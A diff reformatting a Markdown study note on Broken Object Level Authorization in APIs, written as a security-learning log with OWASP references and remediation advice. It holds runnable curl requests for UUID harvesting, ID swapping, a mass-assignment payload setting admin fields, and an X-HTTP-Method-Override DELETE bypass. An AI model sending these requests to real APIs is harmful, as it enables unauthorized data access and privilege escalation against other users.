@@ -1,66 +1,164 @@
 # 🎯 Day 3: Broken Object Level Authorization (BOLA) & Privilege Escalation
-**Focus:** Testing the "Authorization" layer. This research investigates how to bypass permission checks to access or modify data belonging to other users.
 
 ---
 
-## 📘 Theory: Authentication vs. Authorization
-* **Authentication (AuthN):** "Who are you?" (Identity verified by JWT).
-* **Authorization (AuthZ):** "What are you allowed to do?" (Permissions verified by Backend).
-* **BOLA:** The #1 API vulnerability. It occurs when a server trusts a user-supplied ID without verifying if the user owns that object.
+## 📘 Overview
+
+**Broken Object Level Authorization (BOLA)** occurs when an API allows an authenticated user to access or manipulate objects they do not own due to missing or improper authorization checks.
 
 ---
 
-## 🕵️‍♂️ The 5-Step Investigation Flow
+## 🔐 Authentication vs Authorization
 
-### 🛠️ Step 1: Hunting for Identifiers
-I first map the API to find where IDs are used.
-* **URL:** `/api/v1/users/101/profile`
-* **Query:** `/api/v1/download?file_id=999`
-* **Body:** `{"order_id": "ORD-44"}`
+| Concept                | Meaning                                    |
+| ---------------------- | ------------------------------------------ |
+| Authentication (AuthN) | Who the user is (JWT / session validation) |
+| Authorization (AuthZ)  | What the user is allowed to access         |
+| BOLA                   | Backend trusts user-supplied object IDs    |
 
 ---
 
-### 🛠️ Step 2: ID Harvesting (The Investigation)
-If IDs are non-guessable (UUIDs), I find them in public endpoints.
+## 🧪 Investigation Workflow
+
+---
+
+## 🛠️ Step 1: Identifier Discovery
+
+**Goal:** Identify where object IDs are used in API requests.
+
+### Common Locations
+
+* **Path Parameters**
+
+  ```
+  /api/v1/users/101/profile
+  ```
+
+* **Query Parameters**
+
+  ```
+  /api/v1/download?file_id=999
+  ```
+
+* **Request Body**
+
+  ```json
+  {
+    "order_id": "ORD-44"
+  }
+  ```
+
+---
+
+## 🛠️ Step 2: ID Harvesting
+
+**Goal:** Collect valid object IDs from public or low-privileged endpoints.
+
+### UUID Extraction Example
 
 ```bash
-# Extracting Target UUIDs from public search results
-curl -x "https://api.site.com/v1/public/users" | grep -E -o "[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}"
-🛠️ Step 3: The BOLA Attack (The Swap)
-Testing if I can see another user's private data using my valid token.
+curl -s "https://api.site.com/v1/public/users" \
+| grep -E -o "[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}"
+```
 
-Bash
+### Why This Works
 
-# Swapping my ID for the Target ID harvested in Step 2
+* Public APIs often leak internal object references
+* UUIDs are assumed secure but frequently exposed
+
+---
+
+## 🛠️ Step 3: BOLA Exploitation (ID Swap)
+
+**Goal:** Access another user’s private data using a valid token.
+
+### ID Swap Test
+
+```bash
 curl -X GET "https://api.site.com/v1/messages/TARGET_ID" \
 -H "Authorization: Bearer <MY_VALID_TOKEN>"
-🛠️ Step 4: Mass Assignment (The Injection)
-Testing if I can change my own permissions by adding "hidden" admin fields.
+```
 
-Bash
+### Vulnerability Indicator
 
-# Injecting 'is_admin' into a standard profile update request
+* Other user’s private data returned
+* No ownership validation on backend
+
+---
+
+## 🛠️ Step 4: Mass Assignment
+
+**Goal:** Modify sensitive fields not intended for user control.
+
+### Payload Injection
+
+```bash
 curl -X PATCH "https://api.site.com/v1/user/update" \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer <TOKEN>" \
--d '{"username": "new_name", "is_admin": true, "role": "admin"}'
-🛠️ Step 5: Advanced Bypasses (Header/Method Tampering)
-If a direct swap is blocked (403), I try to confuse the Gateway/WAF using Method Overrides or Header Injection.
+-d '{
+  "username": "new_name",
+  "is_admin": true,
+  "role": "admin"
+}'
+```
 
-Bash
+### Vulnerability Indicator
 
-# Using Header Override to bypass Authorization filters
+* Privilege escalation
+* Backend blindly maps request body to object model
+
+---
+
+## 🛠️ Step 5: Advanced Authorization Bypass
+
+**Goal:** Bypass authorization checks using method confusion.
+
+### HTTP Method Override
+
+```bash
 curl -X POST "https://api.site.com/v1/user/101" \
 -H "X-HTTP-Method-Override: DELETE" \
 -H "Authorization: Bearer <TOKEN>"
-📊 Results Analysis
-Vulnerable: 200 OK or 204 No Content when accessing/changing other users' data.
+```
 
-Secure: 403 Forbidden or 401 Unauthorized across all bypass attempts.
+### Why This Works
 
-🛡️ Remediation Strategy
-Enforce Object Ownership: Backend must check JWT.sub == resource.owner_id.
+* Gateway validates POST request
+* Backend executes overridden method (DELETE)
 
-Input Filtering: Use strict "Allow-lists" to block Mass Assignment.
+---
 
-Randomized IDs: Use UUID v4 to prevent ID enumeration.
+## 🚨 Impact
+
+* Unauthorized data access
+* Account takeover
+* Privilege escalation
+* Full application compromise
+
+---
+
+## 🛡️ Remediation Guidelines
+
+### ✅ Enforce Object Ownership
+
+```
+JWT.sub MUST match resource.owner_id
+```
+
+### ✅ Prevent Mass Assignment
+
+* Use strict allow-lists
+* Never auto-bind request bodies to models
+
+### ✅ Secure Object References
+
+* Use UUID v4
+* Do not expose internal IDs in public endpoints
+
+---
+
+## 📚 References
+
+* OWASP API Security Top 10 – API1: Broken Object Level Authorization
+* OWASP Mass Assignment Cheat Sheet
